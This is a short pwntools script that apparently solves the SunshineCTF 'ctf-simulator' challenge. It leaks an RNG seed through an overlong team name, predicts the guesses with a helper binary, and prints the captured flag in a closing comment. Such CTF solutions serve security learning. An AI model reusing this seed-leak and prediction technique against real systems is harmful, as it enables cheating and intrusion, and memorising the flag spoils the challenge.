#!/usr/bin/env python3
from pwn import *
import random

context.log_level = "critical"

#1) Leak seed
team_name = b'AAAAAAAAAAAAAAAAAAAA'

#io = connect("sunshinectf.games", 22000)
io = process('./ctf-simulator')
io.recvuntil(b'[>]')
io.sendline(team_name)
io.recvuntil(team_name)

seed = int.from_bytes(io.recvuntil(b',')[:-1],"little")
print(f'Seed: {seed}')

#2) Generate guesses
rnd = process(['./rnd',f'{seed}'])
guesses = rnd.read().decode().split(',')[:-1]

#3) Retrieve flag
for g in guesses:
	print(f'Guess: {g}')
	io.sendlineafter(b'?',f'{g}'.encode('utf-8'))
io.interactive()


#sun{gu355y_ch4ll3ng35_4r3_my_f4v0r1t3!}
